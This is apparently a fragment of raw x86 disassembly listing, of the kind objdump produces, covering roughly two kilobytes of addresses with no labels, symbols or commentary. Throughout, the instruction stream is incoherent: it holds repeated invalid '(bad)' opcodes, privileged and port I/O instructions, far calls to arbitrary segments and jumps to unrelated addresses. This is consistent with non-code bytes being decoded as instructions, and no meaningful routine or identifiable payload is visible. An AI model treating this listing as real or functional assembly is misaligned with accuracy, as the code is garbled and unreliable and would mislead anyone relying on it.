  40b456:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b457:	add    ch,ch
  40b459:	cmp    eax,0xe31c7ad4
  40b45e:	(bad)  
  40b45f:	xchg   edi,eax
  40b460:	dec    eax
  40b461:	dec    edi
  40b462:	jecxz  0x40b44f
  40b464:	pushf  
  40b465:	xchg   BYTE PTR ds:0x459f5f48,bh
  40b46b:	inc    ebx
  40b46c:	ja     0x40b431
  40b46e:	imul   esp,DWORD PTR [edi],0x9
  40b471:	sub    al,BYTE PTR [esi+0x354fbb7d]
  40b477:	mov    ah,0x4c
  40b479:	fst    DWORD PTR [bp+di-0x69]
  40b47d:	das    
  40b47e:	or     eax,0xa32e1040
  40b483:	add    DWORD PTR [ebp-0x32351119],esp
  40b489:	mov    dl,BYTE PTR [eax+0x6a652417]
  40b48f:	fs and al,0x29
  40b492:	inc    esp
  40b493:	inc    edx
  40b494:	jge    0x40b429
  40b496:	ins    DWORD PTR es:[edi],dx
  40b497:	clc    
  40b498:	retf   0x5408
  40b49b:	adc    esi,DWORD PTR gs:[edi]
  40b49e:	inc    esp
  40b49f:	pushf  
  40b4a0:	push   0xffffff87
  40b4a2:	aaa    
  40b4a3:	cld    
  40b4a4:	out    dx,eax
  40b4a5:	dec    edi
  40b4a6:	and    eax,0xc2e6e535
  40b4ab:	mov    cs,WORD PTR es:[esi+0xc]
  40b4af:	int3   
  40b4b0:	ins    DWORD PTR es:[edi],dx
  40b4b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4b2:	mov    ebx,DWORD PTR [eax]
  40b4b4:	mov    DWORD PTR ss:[ebx],edi
  40b4b7:	fnstenv [edi+edi*1+0x4c]
  40b4bb:	pop    esp
  40b4bc:	outs   dx,BYTE PTR ds:[esi]
  40b4bd:	lods   al,BYTE PTR ds:[esi]
  40b4be:	pop    eax
  40b4bf:	and    eax,0x63f6e8b
  40b4c4:	iret   
  40b4c5:	push   es
  40b4c6:	std    
  40b4c7:	movhps QWORD PTR [eax+eiz*8-0x11],xmm0
  40b4cc:	mov    dh,0x97
  40b4ce:	call   0x5500:0xd24887a1
  40b4d5:	call   0x2a6b:0x32338c05
  40b4dc:	sbb    BYTE PTR [edi+0x63],ah
  40b4df:	jge    0x40b489
  40b4e1:	fbld   TBYTE PTR [edx+edi*8+0x53f5a6b8]
  40b4e8:	aam    0xc3
  40b4ea:	inc    eax
  40b4eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4ec:	xchg   edx,eax
  40b4ed:	call   0xe6e4:0x9c74e46a
  40b4f4:	or     eax,0x50c49650
  40b4f9:	xor    edi,DWORD PTR [ebx+0xc]
  40b4fc:	fbstp  TBYTE PTR [ebx]
  40b4fe:	rcr    DWORD PTR [edx],cl
  40b500:	sbb    eax,0x5ef05a5f
  40b505:	adc    bh,BYTE PTR [ebp-0x2f8f3e7b]
  40b50b:	cdq    
  40b50c:	pop    ebx
  40b50d:	jb     0x40b50f
  40b50f:	imul   ecx,DWORD PTR [ecx+edx*8+0x38492b87],0x41511c7b
  40b51a:	add    eax,0x8c931f8d
  40b51f:	fild   WORD PTR [ebp-0x4d]
  40b522:	xor    esi,esp
  40b524:	jecxz  0x40b510
  40b526:	rcl    DWORD PTR [ecx+0x4c],1
  40b529:	ret    0x645a
  40b52c:	imul   edx,DWORD PTR [edi-0x7d],0x5e
  40b530:	lock mov ah,BYTE PTR [ecx+0x5b]
  40b534:	push   eax
  40b535:	push   ebx
  40b536:	xchg   ebp,eax
  40b537:	imul   edi,ebp,0x65
  40b53a:	cmc    
  40b53b:	loope  0x40b518
  40b53d:	xchg   esp,eax
  40b53e:	adc    eax,0x35374531
  40b543:	aaa    
  40b544:	push   cs
  40b545:	adc    BYTE PTR [edi-0x54],cl
  40b548:	clc    
  40b549:	sub    DWORD PTR [eax],esi
  40b54b:	cmp    dh,BYTE PTR [esi+0x201f61]
  40b551:	jmp    0x92f2b41f
  40b556:	bound  edi,QWORD PTR [edi+0x25]
  40b559:	popa   
  40b55a:	inc    BYTE PTR ds:[edx]
  40b55d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b55e:	pushf  
  40b55f:	rcr    esi,0x37
  40b562:	outs   dx,BYTE PTR ds:[esi]
  40b563:	jno    0x40b563
  40b565:	inc    eax
  40b566:	push   ebx
  40b567:	sbb    BYTE PTR [edi+0x70],dl
  40b56a:	fadd   DWORD PTR [esi+edi*1+0x631ec8ed]
  40b571:	mov    edi,0x71475270
  40b576:	int3   
  40b577:	cdq    
  40b578:	scas   al,BYTE PTR es:[edi]
  40b579:	xchg   ebx,eax
  40b57b:	push   ebp
  40b57c:	adc    DWORD PTR [ebp+0x6f29e1d3],ebp
  40b582:	cmp    ah,al
  40b584:	sub    eax,0xda952d1a
  40b589:	fsubrp st(4),st
  40b58b:	xchg   ebp,eax
  40b58c:	cs dec ebp
  40b58e:	sub    DWORD PTR [ebx],0xffffffad
  40b591:	adc    eax,0x39da6160
  40b596:	sbb    esp,esi
  40b598:	sbb    edx,DWORD PTR [ebp-0x29f08dca]
  40b59e:	and    ecx,esp
  40b5a0:	sub    BYTE PTR [esi+0x643c1e79],0x4a
  40b5a7:	rcl    DWORD PTR [edx],cl
  40b5a9:	dec    esi
  40b5aa:	test   al,0xb5
  40b5ac:	or     eax,0xdbd00c51
  40b5b1:	pop    edx
  40b5b2:	push   ebx
  40b5b3:	xor    eax,0xb315f62e
  40b5b8:	pop    ebx
  40b5b9:	repz jmp 0xd45d360d
  40b5bf:	adc    ah,0xbf
  40b5c2:	mov    cl,0x24
  40b5c4:	int3   
  40b5c5:	cwde   
  40b5c6:	arpl   WORD PTR [edi],cx
  40b5c8:	jmp    0x40b572
  40b5ca:	nop
  40b5cb:	sbb    ebp,DWORD PTR [edx]
  40b5cd:	xchg   esp,eax
  40b5ce:	sbb    DWORD PTR [eax+ecx*1],ebx
  40b5d1:	(bad)  
  40b5d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5d3:	test   BYTE PTR [eax],dh
  40b5d5:	mov    ds:0xf225a0a4,eax
  40b5da:	jno    0x40b630
  40b5dc:	ds stos BYTE PTR es:[edi],al
  40b5de:	mov    ds:0x886be74a,al
  40b5e3:	mov    ds:0xd346125c,eax
  40b5e8:	push   0xae1bdc48
  40b5ed:	push   ebx
  40b5ee:	add    edx,DWORD PTR [edi+0x38]
  40b5f1:	sub    BYTE PTR [esi],bh
  40b5f3:	jb     0x40b5ac
  40b5f5:	sbb    cl,BYTE PTR [esi]
  40b5f7:	xor    cl,ah
  40b5f9:	inc    esi
  40b5fa:	(bad)  
  40b5fb:	cmc    
  40b5fc:	int    0x41
  40b5fe:	inc    eax
  40b5ff:	out    dx,eax
  40b600:	jmp    0xc6dd6225
  40b605:	dec    edx
  40b606:	mov    DWORD PTR [edx+0x6f7643f7],ecx
  40b60c:	sub    al,0x73
  40b60e:	in     al,dx
  40b60f:	scas   al,BYTE PTR es:[edi]
  40b610:	ret    0x52e9
  40b613:	neg    BYTE PTR [ebp+edx*2-0x28060a43]
  40b61a:	call   0x4bf:0xd127922f
  40b621:	push   0xffffffe4
  40b623:	xor    bl,al
  40b625:	gs and eax,esi
  40b628:	dec    ebx
  40b629:	jle    0x40b5d6
  40b62b:	or     edi,DWORD PTR ds:0xa8c96c11
  40b631:	mov    ebp,0x892e46af
  40b636:	sbb    al,0x4d
  40b638:	and    ah,BYTE PTR [eax]
  40b63a:	ins    DWORD PTR es:[edi],dx
  40b63b:	rcr    BYTE PTR [edi-0x3e],0x96
  40b63f:	std    
  40b640:	fs into 
  40b642:	cmc    
  40b643:	mov    al,0xe1
  40b645:	jl     0x40b6b0
  40b647:	inc    eax
  40b648:	pop    edx
  40b649:	out    0x17,al
  40b64b:	mov    ebp,0x8fe727a9
  40b650:	(bad)  
  40b651:	xchg   ecx,eax
  40b652:	xchg   edi,eax
  40b653:	xor    eax,0xb6b740af
  40b658:	cmp    al,0x58
  40b65a:	cmp    DWORD PTR ds:[edi+0x2],ebx
  40b65e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b65f:	adc    cl,BYTE PTR [ebx]
  40b661:	cmp    ebp,0x36c110b5
  40b667:	and    eax,0x377db8e7
  40b66c:	bound  eax,QWORD PTR [ebx-0x5d804395]
  40b672:	sub    al,0x36
  40b674:	pop    edi
  40b675:	fisub  WORD PTR [ebp+0x548f87b7]
  40b67b:	pop    es
  40b67c:	push   edx
  40b67d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b67e:	in     al,dx
  40b67f:	lods   al,BYTE PTR ds:[esi]
  40b680:	sahf   
  40b681:	test   DWORD PTR [ebp+0x431908db],0xfb59f677
  40b68b:	push   eax
  40b68c:	cmp    edi,ebp
  40b68e:	(bad)  
  40b68f:	dec    BYTE PTR [ebp-0x1d13e96e]
  40b695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b696:	fidivr WORD PTR [ebp-0x7797aa22]
  40b69c:	dec    edi
  40b69d:	(bad)  
  40b69e:	cmp    DWORD PTR [esi],edx
  40b6a0:	aaa    
  40b6a1:	mov    ebx,0x35fd178f
  40b6a6:	mov    ch,0x71
  40b6a8:	sbb    al,0x4b
  40b6aa:	sub    eax,0x5a91ea92
  40b6af:	push   edi
  40b6b0:	pop    es
  40b6b1:	mov    ebx,0xf9b237c3
  40b6b6:	and    edx,0x18c7c44b
  40b6bc:	mov    esi,0xf0c8dd80
  40b6c1:	or     DWORD PTR [eax-0x227c0b9c],0x7f
  40b6c8:	mov    ah,0x5c
  40b6ca:	inc    esp
  40b6cb:	and    BYTE PTR [ebx+0x18c8e36c],0x3b
  40b6d2:	push   edi
  40b6d3:	scas   eax,DWORD PTR es:[edi]
  40b6d4:	push   0xd82d373d
  40b6d9:	jmp    ecx
  40b6db:	shl    BYTE PTR [edi+0x48a0e5fa],0x49
  40b6e2:	pop    ecx
  40b6e3:	jbe    0x40b68a
  40b6e5:	and    BYTE PTR [esi+0x10],0xbd
  40b6e9:	mov    ds:0xc70b8244,eax
  40b6ee:	int3   
  40b6ef:	int    0x75
  40b6f1:	dec    eax
  40b6f2:	jg     0x40b6fd
  40b6f4:	nop
  40b6f5:	(bad)  
  40b6f6:	fldenv [ecx]
  40b6f8:	jl     0x40b74b
  40b6fa:	mov    dl,ch
  40b6fc:	and    DWORD PTR [esi-0x68],eax
  40b6ff:	adc    ebp,edx
  40b701:	xor    al,0x37
  40b703:	adc    DWORD PTR [edi],esp
  40b705:	mov    esp,0x8f35b390
  40b70a:	(bad)
  40b70d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b70e:	mov    dh,0x39
  40b710:	mov    ecx,0xd9845dc4
  40b715:	stos   BYTE PTR es:[edi],al
  40b716:	fnsave [eax]
  40b718:	stos   BYTE PTR es:[edi],al
  40b719:	add    BYTE PTR [ecx],dh
  40b71b:	cs ret 0x75
  40b71f:	ret    
  40b720:	inc    ebx
  40b721:	or     BYTE PTR [edx-0x7e],dh
  40b724:	sub    al,0x86
  40b726:	mov    ch,0x47
  40b728:	fst    QWORD PTR [edx-0x5e14f01d]
  40b72e:	push   ss
  40b72f:	and    al,0x95
  40b731:	ret    0x494e
  40b734:	mov    eax,0x62dff874
  40b739:	sahf   
  40b73a:	add    eax,0x42d949a8
  40b73f:	ins    DWORD PTR es:[edi],dx
  40b740:	mov    BYTE PTR [ecx+0x30],dl
  40b743:	cdq    
  40b744:	inc    edx
  40b745:	adc    cl,BYTE PTR [edi+0x3c]
  40b748:	(bad)  
  40b749:	fidivr DWORD PTR [edx+0x4d]
  40b74c:	xchg   edx,eax
  40b74d:	push   es
  40b74e:	or     al,0x9f
  40b750:	adc    al,BYTE PTR [esi-0x36]
  40b753:	sub    esp,DWORD PTR [edx]
  40b755:	inc    esp
  40b756:	test   DWORD PTR [eax-0x5d],ecx
  40b759:	mov    dl,0x33
  40b75b:	in     al,dx
  40b75c:	sub    DWORD PTR [ebp+0x65],edx
  40b75f:	adc    bh,BYTE PTR [esi+eax*2]
  40b762:	in     eax,0x39
  40b764:	pop    ecx
  40b765:	aaa    
  40b766:	adc    DWORD PTR [edi+0x531fa5fb],0x8756913d
  40b770:	mov    eax,ds:0xca41bc98
  40b775:	daa    
  40b776:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b777:	push   edx
  40b778:	inc    esp
  40b779:	pop    edi
  40b77a:	iret   
  40b77b:	das    
  40b77c:	pop    esi
  40b77d:	jbe    0x40b79a
  40b77f:	pop    ebp
  40b780:	fwait
  40b781:	clc    
  40b782:	stos   BYTE PTR es:[edi],al
  40b783:	or     DWORD PTR [edi+0xada14b8],0x1d934ddb
  40b78d:	lock loop 0x40b807
  40b790:	pop    ebx
  40b791:	cmp    eax,0x79d9a33e
  40b796:	inc    edi
  40b797:	(bad)
  40b79a:	mov    ebp,0xdd21b50b
  40b79f:	and    DWORD PTR [esi-0x1f669baa],ebx
  40b7a5:	mov    cl,0xec
  40b7a7:	push   esp
  40b7a8:	xchg   BYTE PTR [edx+0x7328ae6c],bl
  40b7ae:	ror    DWORD PTR [esi-0x7c],cl
  40b7b1:	xor    edi,DWORD PTR [edx+0x58]
  40b7b4:	or     al,0xea
  40b7b6:	push   edx
  40b7b7:	inc    eax
  40b7b8:	mov    ds:0xe8ce634e,eax
  40b7bd:	xchg   ebx,eax
  40b7be:	test   ah,ch
  40b7c0:	cmp    BYTE PTR ds:0xea6fd2d,al
  40b7c6:	mov    ebx,0x52971168
  40b7cb:	pop    ebx
  40b7cc:	bound  ebx,QWORD PTR ds:0x96ea3690
  40b7d2:	sbb    bh,BYTE PTR [esi]
  40b7d4:	or     al,0x1d
  40b7d6:	jmp    0x40b7dd
  40b7d8:	xchg   esp,eax
  40b7d9:	mov    eax,0x27dd654a
  40b7de:	sub    bl,BYTE PTR gs:[esi]
  40b7e1:	inc    edi
  40b7e2:	cli    
  40b7e3:	jp     0x40b82f
  40b7e5:	clc    
  40b7e6:	hlt    
  40b7e7:	icebp  
  40b7e8:	sti    
  40b7e9:	sub    esi,DWORD PTR ds:0x99fa5892
  40b7ef:	fnsave ds:0xba919424
  40b7f5:	repnz inc eax
  40b7f7:	lea    edx,[ecx]
  40b7f9:	jg     0x40b80c
  40b7fb:	retf   0x1311
  40b7fe:	add    eax,0xa8ec1af9
  40b803:	push   0xffffffe0
  40b805:	mov    DWORD PTR [ecx+0x68f4ac3e],esp
  40b80b:	jne    0x40b80e
  40b80d:	lods   eax,DWORD PTR ds:[esi]
  40b80e:	xchg   esp,eax
  40b80f:	inc    esp
  40b810:	call   0xe4ee:0x3ae2c68d
  40b817:	enter  0x9eb5,0x7c
  40b81b:	xchg   esp,eax
  40b81c:	fmul   DWORD PTR [ecx]
  40b81e:	push   ds
  40b81f:	pop    ecx
  40b820:	stc    
  40b821:	test   BYTE PTR [ebp-0x79],dh
  40b824:	xchg   ebx,eax
  40b825:	ins    BYTE PTR es:[edi],dx
  40b826:	stos   BYTE PTR es:[edi],al
  40b827:	inc    edi
  40b828:	xchg   ecx,eax
  40b829:	arpl   bx,sp
  40b82b:	ds xor eax,0x7b1990c3
  40b831:	pop    ecx
  40b832:	mov    ch,0x4e
  40b834:	lock cmc 
  40b836:	and    DWORD PTR [eax],edi
  40b838:	or     al,0xa6
  40b83a:	in     eax,dx
  40b83b:	mov    si,cx
  40b83e:	mov    bh,ah
  40b840:	mov    edx,0x53ea09fa
  40b845:	mov    DWORD PTR [edx],esp
  40b847:	push   edi
  40b848:	sub    eax,0xc5b9ee41
  40b84d:	xor    DWORD PTR [ebx],edi
  40b84f:	call   0x66f9:0xa9ada13c
  40b856:	retf   0x5bd1
  40b859:	imul   eax,DWORD PTR [eax-0x2d1bbacf],0xffffff89
  40b860:	sbb    eax,0x6c4f70fb
  40b865:	dec    ebx
  40b866:	hlt    
  40b867:	in     eax,0xde
  40b869:	sub    DWORD PTR [ebx],esp
  40b86b:	xor    esp,DWORD PTR [ebx+eax*8+0x78dfa668]
  40b872:	push   esi
  40b873:	inc    esi
  40b874:	pop    esp
  40b875:	push   ebp
  40b876:	outs   dx,BYTE PTR ds:[esi]
  40b877:	add    DWORD PTR [ebp+0x79],edx
  40b87a:	fmul   DWORD PTR [ebx-0x1b02be82]
  40b880:	add    DWORD PTR [ebx],0xa89efc40
  40b886:	out    dx,al
  40b887:	mov    edx,0x1cf2d3e
  40b88c:	inc    edi
  40b88d:	or     al,0xf2
  40b88f:	ret    0xc2ca
  40b892:	mov    ds:0xb04373e,eax
  40b897:	fnsave [eax-0x26]
  40b89a:	out    dx,eax
  40b89b:	and    eax,0xbd4b25e
  40b8a0:	test   BYTE PTR [edx+0x2e573533],cl
  40b8a6:	jp     0x40b8eb
  40b8a8:	mov    esp,0x2240a85b
  40b8ad:	mov    dh,0x4e
  40b8af:	es pushf 
  40b8b1:	test   al,0x7
  40b8b3:	outs   dx,DWORD PTR ds:[esi]
  40b8b4:	fld    TBYTE PTR [eax-0x15ec0cbc]
  40b8ba:	int    0x23
  40b8bc:	ss (bad) 
  40b8bf:	fimul  WORD PTR [ebx-0x53]
  40b8c2:	(bad)  
  40b8c3:	sub    edi,DWORD PTR [ebx+0x2d]
  40b8c6:	jl     0x40b938
  40b8c8:	pop    es
  40b8c9:	jne    0x40b8cc
  40b8cb:	js     0x40b877
  40b8cd:	cdq    
  40b8ce:	shr    ch,1
  40b8d0:	push   edx
  40b8d1:	mov    cl,0xa1
  40b8d3:	dec    eax
  40b8d4:	xchg   ecx,eax
  40b8d5:	(bad)  
  40b8d6:	and    al,BYTE PTR [edi+0x22]
  40b8d9:	push   0xd46d0f33
  40b8de:	pusha  
  40b8df:	cmc    
  40b8e0:	adc    BYTE PTR [edx],ah
  40b8e2:	ss rol ebx,1
  40b8e5:	sbb    DWORD PTR [ecx+0x30],0xbbf405ef
  40b8ec:	dec    esp
  40b8ed:	mov    edx,0x5a58b280
  40b8f2:	mov    ebx,0xac2ed0f2
  40b8f7:	rol    DWORD PTR [ecx-0x3a],0x13
  40b8fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8fc:	jl     0x40b91f
  40b8fe:	(bad)  
  40b8ff:	scas   al,BYTE PTR es:[edi]
  40b900:	mov    edx,0x4c0645f5
  40b905:	in     al,dx
  40b906:	cmp    al,0xf0
  40b908:	jle    0x40b8cb
  40b90a:	out    0xa1,eax
  40b90c:	call   0xd46c855f
  40b911:	push   esp
  40b912:	xchg   ebp,eax
  40b913:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b914:	pusha  
  40b915:	mov    eax,ds:0xf723e7ad
  40b91a:	or     DWORD PTR [eax],esp
  40b91c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b91d:	clc    
  40b91e:	icebp  
  40b91f:	(bad)  
  40b920:	ins    BYTE PTR es:[edi],dx
  40b921:	mov    bl,0x67
  40b923:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b924:	jmp    0x40b962
  40b926:	nop
  40b927:	cmp    al,BYTE PTR [ebx-0x2746dbbb]
  40b92d:	pushf  
  40b92e:	arpl   WORD PTR [eax-0x56],di
  40b931:	enter  0x14c6,0x18
  40b935:	fwait
  40b936:	adc    dl,BYTE PTR [edi+0x2b]
  40b939:	mov    edi,0x6e801e86
  40b93e:	mov    BYTE PTR [edi],dl
  40b940:	and    eax,0x59aa2213
  40b945:	popf   
  40b946:	neg    bh
  40b948:	arpl   WORD PTR [ebp-0xa],di
  40b94b:	mov    edi,0xe392e0dc
  40b950:	cmp    bh,BYTE PTR [esi-0x223bac27]
  40b956:	xor    ah,al
  40b958:	mov    ds:0xae736762,al
  40b95d:	icebp  
  40b95e:	sbb    BYTE PTR [ebp+0x75],bh
  40b961:	sbb    esi,esp
  40b963:	mul    esi
  40b965:	or     eax,0xab297550
  40b96a:	push   esi
  40b96b:	and    DWORD PTR [ecx+0x7d],edi
  40b96e:	push   edi
  40b96f:	adc    ch,0xac
  40b972:	xor    BYTE PTR [edi+esi*1-0xd],bh
  40b976:	jp     0x40b9d2
  40b978:	lahf   
  40b979:	mov    edx,ss
  40b97b:	stc    
  40b97c:	fldcw  WORD PTR [edx]
  40b97e:	sbb    bh,BYTE PTR gs:[edx+edx*8+0x4c7c5c3f]
  40b986:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b987:	xor    ah,dl
  40b989:	test   BYTE PTR [ebx],bh
  40b98b:	jl     0x40b968
  40b98d:	mov    eax,0x54c81296
  40b992:	inc    eax
  40b993:	out    0xc6,eax
  40b995:	cmp    eax,0x1a7c17ef
  40b99a:	loopne 0x40b9fc
  40b99c:	push   ds
  40b99d:	sub    eax,0xf0db929f
  40b9a2:	enter  0xb350,0xe
  40b9a6:	fwait
  40b9a7:	ret    
  40b9a8:	cmp    dh,bl
  40b9aa:	sbb    eax,0x46b94f14
  40b9af:	sbb    al,0xa6
  40b9b1:	mov    eax,0xb0fdedc3
  40b9b6:	pop    esp
  40b9b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9b8:	mov    ds:0xf460e670,eax
  40b9bd:	pop    eax
  40b9be:	push   ss
  40b9bf:	test   DWORD PTR [esi+0x21],eax
  40b9c2:	aad    0x79
  40b9c4:	ss push es
  40b9c6:	jmp    0x9d5f:0xb8064d95
  40b9cd:	mov    bh,0x1d
  40b9cf:	mov    cl,0xcc
  40b9d1:	add    eax,0x995aa1ca
  40b9d6:	(bad)  
  40b9d7:	dec    edx
  40b9d8:	repnz xor eax,DWORD PTR [edx-0x93312ee]
  40b9df:	sbb    eax,DWORD PTR [edi+0x64d22786]
  40b9e5:	xor    eax,0xf07bc8e8
  40b9ea:	add    cl,BYTE PTR [esi-0x40eb8c83]
  40b9f0:	mov    ecx,0xb3c7210a
  40b9f5:	int3   
  40b9f6:	adc    DWORD PTR [edx+0x659b3794],eax
  40b9fc:	or     al,0xb7
  40b9fe:	jns    0x40ba23
  40ba00:	inc    esi
  40ba01:	inc    edi
  40ba02:	mov    cl,0xa9
  40ba04:	ficom  WORD PTR [esi+edx*1+0x7a]
  40ba08:	dec    esi
  40ba09:	pop    ebp
  40ba0a:	pop    eax
  40ba0b:	das    
  40ba0c:	pop    esp
  40ba0d:	bound  edx,QWORD PTR [ebx-0x491c5564]
  40ba13:	xchg   esp,eax
  40ba14:	xchg   ecx,eax
  40ba15:	pop    ebp
  40ba16:	push   esi
  40ba17:	out    dx,eax
  40ba18:	jbe    0x40ba7f
  40ba1a:	jle    0x40b9e1
  40ba1c:	or     BYTE PTR [eax-0x3c608f7e],ch
  40ba22:	test   DWORD PTR [eax-0x1e3056ee],0x92b68214
  40ba2c:	scas   eax,DWORD PTR es:[edi]
  40ba2d:	cmp    ebx,edx
  40ba2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba30:	ins    BYTE PTR es:[edi],dx
  40ba31:	push   ebp
  40ba32:	pop    ebx
  40ba33:	xchg   ecx,eax
  40ba34:	ins    BYTE PTR es:[edi],dx
  40ba35:	pop    eax
  40ba36:	iret   
  40ba37:	test   BYTE PTR [eax+ecx*2],0x93
  40ba3b:	mov    BYTE PTR [ecx+0x1d355d57],ah
  40ba41:	xchg   edi,eax
  40ba42:	or     bh,BYTE PTR [edi]
  40ba44:	(bad)  
  40ba45:	stos   BYTE PTR es:[edi],al
  40ba46:	adc    eax,0x675b2a05
  40ba4b:	mov    edi,0x5d6b9d99
  40ba50:	dec    eax
  40ba51:	push   edi
  40ba52:	aad    0xce
  40ba54:	mov    edi,0xf358a448
  40ba59:	fucomip st,st(1)
  40ba5b:	push   ebx
  40ba5c:	push   ebx
  40ba5d:	ja     0x40ba06
  40ba5f:	xchg   edx,eax
  40ba60:	bound  esp,QWORD PTR ds:0x42cbf0e3
  40ba66:	scas   al,BYTE PTR es:[edi]
  40ba67:	dec    esp
  40ba68:	jg     0x40ba97
  40ba6a:	push   esi
  40ba6b:	stos   BYTE PTR es:[edi],al
  40ba6c:	shr    BYTE PTR [ecx-0x57],0x6c
  40ba70:	and    ebp,DWORD PTR [edx+0x9]
  40ba73:	out    dx,eax
  40ba74:	xchg   edi,eax
  40ba75:	call   0x997c648c
  40ba7a:	add    dh,BYTE PTR [eax]
  40ba7c:	jmp    edx
  40ba7e:	std    
  40ba7f:	add    DWORD PTR [ebx+esi*4+0x304849f6],esi
  40ba86:	or     eax,0x8418f9f
  40ba8b:	sub    eax,0x6e2622e
  40ba90:	jns    0x40ba5c
  40ba92:	adc    bl,BYTE PTR [edx+eax*8]
  40ba95:	imul   eax,DWORD PTR [edi+0x59],0x21
  40ba99:	and    al,0xb5
  40ba9b:	inc    ebp
  40ba9c:	sahf   
  40ba9d:	inc    edx
  40ba9e:	(bad)  
  40ba9f:	xchg   edi,eax
  40baa0:	loop   0x40baa4
  40baa2:	mov    edx,0x4f45883f
  40baa7:	ins    BYTE PTR es:[edi],dx
  40baa8:	loope  0x40ba44
  40baaa:	into   
  40baab:	or     esp,DWORD PTR [ecx+0x38c5945a]
  40bab1:	into   
  40bab2:	icebp  
  40bab3:	sbb    al,0xa9
  40bab5:	mov    ch,0xd0
  40bab7:	aaa    
  40bab8:	test   DWORD PTR [bp+si-0x20],0x631db6a9
  40bac0:	add    DWORD PTR [ebx-0x3d],ebx
  40bac3:	adc    ecx,esp
  40bac5:	jno    0x40bb42
  40bac7:	push   0xf15bc6b3
  40bacc:	push   esp
  40bacd:	or     BYTE PTR [edi+0x69],bh
  40bad0:	rol    DWORD PTR [edx+0x553144f9],1
  40bad6:	sahf   
  40bad7:	or     BYTE PTR [ebp+0x5a02d5ad],al
  40badd:	pop    eax
  40bade:	sbb    DWORD PTR [eax],edi
  40bae0:	pop    esp
  40bae1:	push   es
  40bae2:	push   0xe
  40bae4:	mov    esi,0x9f40d064
  40bae9:	ror    DWORD PTR fs:[edi],1
  40baec:	(bad)  
  40baed:	cmp    al,BYTE PTR [esi-0x12c69179]
  40baf3:	cmp    eax,0xda9336c2
  40baf8:	mov    ebp,0x4541bafe
  40bafd:	(bad)  
  40bafe:	aas    
  40baff:	adc    eax,DWORD PTR [edi+0x456c504f]
  40bb05:	andps  xmm1,XMMWORD PTR [edx+ebp*8-0x5]
  40bb0a:	xor    al,0x48
  40bb0c:	xlat   BYTE PTR ds:[ebx]
  40bb0d:	int3   
  40bb0e:	lods   al,BYTE PTR ds:[esi]
  40bb0f:	fwait
  40bb10:	xchg   esp,eax
  40bb11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb12:	aaa    
  40bb13:	imul   ebp,DWORD PTR [edx+0x25263de3],0x60bf4892
  40bb1d:	out    0xb7,eax
  40bb1f:	dec    edi
  40bb20:	enter  0x87e1,0xc5
  40bb24:	mov    ds:0xa82c08ea,eax
  40bb29:	cmp    esp,DWORD PTR [eax]
  40bb2b:	js     0x40bb51
  40bb2d:	pushf  
  40bb2e:	mov    dl,BYTE PTR [edi+0x6b434c07]
  40bb34:	or     al,0x58
  40bb36:	pop    ebx
  40bb37:	xor    BYTE PTR [edx+0x15684f8f],dl
  40bb3d:	daa    
  40bb3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb3f:	jno    0x40bb4f
  40bb41:	loop   0x40bb4d
  40bb43:	and    DWORD PTR [edx-0x36],0x6d88de87
  40bb4a:	xchg   ebp,ebx
  40bb4c:	je     0x40bada
  40bb4e:	sub    DWORD PTR [ebx-0x656f48cc],ecx
  40bb54:	fild   DWORD PTR [ebp+0x7d8a9671]
  40bb5a:	clc    
  40bb5b:	(bad)
  40bb5f:	daa    
  40bb60:	scas   eax,DWORD PTR es:[edi]
  40bb61:	xchg   eax,edx
  40bb63:	rol    dh,cl
  40bb65:	jp     0x40baf7
  40bb67:	popf   
  40bb68:	(bad)  
  40bb6b:	dec    ebp
  40bb6c:	cld    
  40bb6d:	ja     0x40bb94
  40bb6f:	mov    al,ds:0x7bece363
  40bb74:	and    DWORD PTR ds:0x37567c90,ebp
  40bb7a:	inc    ebx
  40bb7b:	jnp    0x40bb69
  40bb7d:	jo     0x40bb1e
  40bb7f:	pusha  
  40bb80:	mov    bl,0xb6
  40bb82:	dec    eax
  40bb83:	jae    0x40bbc2
  40bb85:	lock dec edi
  40bb87:	push   edx
  40bb88:	jg     0x40bb82
  40bb8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb8b:	inc    esi
  40bb8c:	inc    ebx
  40bb8d:	xchg   edi,eax
  40bb8e:	fdivr  DWORD PTR [ebp-0x5d5f303b]
  40bb94:	lahf   
  40bb95:	dec    edi
  40bb96:	and    al,0xf3
  40bb98:	xchg   esp,eax
  40bb99:	push   ds
  40bb9a:	popa   
  40bb9b:	inc    esi
  40bb9c:	xor    esp,DWORD PTR [esi]
  40bb9e:	mov    ebx,0x66dff10
  40bba3:	retf   0xcb65
  40bba6:	imul   eax,eax,0x63237588
  40bbac:	xlat   BYTE PTR ds:[ebx]
  40bbad:	in     eax,dx
  40bbae:	lea    ebp,ds:0x2a0d36e2
  40bbb4:	test   eax,0x61d0e59
  40bbb9:	cs (bad) 
  40bbbb:	lock es mov edi,esi
  40bbbf:	shr    BYTE PTR [ecx-0x2f],0x23
  40bbc3:	lods   eax,DWORD PTR ds:[esi]
  40bbc4:	fsubr  st,st(6)
  40bbc6:	push   edi
  40bbc7:	or     al,0x4c
  40bbc9:	push   ebp
  40bbca:	pop    eax
  40bbcb:	inc    esp
  40bbcc:	lds    ebp,FWORD PTR [edi+edi*8]
  40bbcf:	(bad)  
  40bbd0:	mov    eax,0x7d4f2f0d
  40bbd5:	xor    eax,0xd2ecfaa
